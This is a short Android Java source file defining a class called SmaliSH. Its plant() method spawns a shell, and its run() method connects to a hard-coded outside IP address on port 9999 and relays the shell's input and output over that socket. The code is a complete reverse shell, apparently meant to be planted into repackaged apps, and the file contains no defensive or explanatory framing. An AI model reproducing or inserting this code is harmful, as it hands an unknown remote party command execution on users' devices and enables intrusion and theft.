package re;

import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

/**
 * 3 threads - asynchronous
 * 3 methods ( may be decreased to 2, by inlining plant )
 * async
 */
public class SmaliSH implements Runnable {
    public static final boolean AGGRESSIVE = false;
    public static final boolean VERBOSE = true;
    public static final String TARGET = "185.227.110.50";
    public static final int TARGET_PORT = 9999;
    public static final String TAG = "re.SmaliSH";
    final Process p;
    final InputStream from;
    final OutputStream to;

    public SmaliSH(Process p, InputStream from, OutputStream to) {
        this.p = p;
        this.from = from;
        this.to = to;
    }


    public static void plant() {
        ProcessBuilder proc = new ProcessBuilder("sh");
        SmaliSH task = null;
        try {
            task = new SmaliSH(proc.start(), null, null);
        } catch (IOException e) {
            if (VERBOSE) Log.e(TAG, "e", e);
            if (AGGRESSIVE) throw new RuntimeException(e);
        }
        new Thread(task, "ReSmaliSH.proc").start();
    }

    @Override
    public void run() {
        if (from == null && to == null) {
            //todo loop retry
            Socket socket = null;
            try {
                socket = new Socket(TARGET, TARGET_PORT);
                socket.setKeepAlive(true);
                socket.getOutputStream().write("re.SmaliSH $ ".getBytes());
                SmaliSH taskIn = new SmaliSH(p, socket.getInputStream(), p.getOutputStream());
                SmaliSH taskOut = new SmaliSH(p, p.getInputStream(), socket.getOutputStream());
                new Thread(taskIn, "ReSmaliSH.task.in").start();
                new Thread(taskOut, "ReSmaliSH.task.out").start();
                p.waitFor();
            } catch (IOException e) {
                if (VERBOSE) Log.e(TAG, "e", e);
                if (AGGRESSIVE) throw new RuntimeException(e);
            } catch (InterruptedException e) {
                if (VERBOSE) Log.e(TAG, "e", e);
                if (AGGRESSIVE) throw new RuntimeException(e);
            }
        } else {
            byte[] buf = new byte[8 * 1024];
            try {
                while (true) {
                    int r = this.from.read(buf);
                    if (r == -1) {
                        if (VERBOSE) Log.e(TAG, "quit");
                        this.p.destroy();
                        break;
                    }
                    this.to.write(buf, 0, r);
                    this.to.flush();
                }
            } catch (IOException e) {
                if (VERBOSE) Log.e(TAG, "e", e);
                if (AGGRESSIVE) throw new RuntimeException(e);
            } finally {
                try {
                    from.close();
                } catch (IOException ignore) {
                }
                try {
                    to.close();
                } catch (IOException ignore) {

                }
            }

        }

    }

}
